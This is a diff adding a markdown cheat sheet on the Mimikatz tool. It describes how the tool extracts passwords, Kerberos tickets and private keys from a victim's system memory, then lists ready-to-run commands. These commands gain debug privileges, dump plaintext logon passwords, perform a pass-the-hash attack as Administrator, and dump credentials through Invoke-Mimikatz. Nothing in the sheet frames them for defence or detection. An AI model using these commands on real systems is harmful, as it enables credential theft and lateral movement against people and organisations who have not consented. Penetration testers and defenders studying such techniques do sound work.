@@ -1,3 +1,28 @@
+# mimikatz
+
+The main functions that Mimikatz enables include:
+- **Extracting passwords from memory**. When run with admin or system
+  privileges, attackers can use Mimikatz to extract plaintext authentication
+  tokens -- passwords and PINs, for example -- from the LSASS process
+  running in system memory.
+- **Extracting Kerberos tickets**. Using a Kerberos module, Mimikatz can
+  access the Kerberos API, enabling a number of different Kerberos exploits
+  that  use Kerberos tickets that have been extracted from system memory.
+- **Extracting certificates and their private keys**. A Windows CryptoAPI
+  module enables Mimikatz to extract certificates -- and the private keys
+  associated with them -- that are stored on the victim system.
+
+# Get elevated privileges
+privilege::debug
+
+# Start logging
+log customlogfilename.log
+
+# Extract plaintext passwords
+sekurlsa::logonpasswords
+
+# Perform Pass-The-Hash Attack
+sekurlsa::pth /user:Administrator /domain:localhost /ntlm:<NTHashHere>
 # Dump credentials
 Invoke-Mimikatz -DumpCreds
 
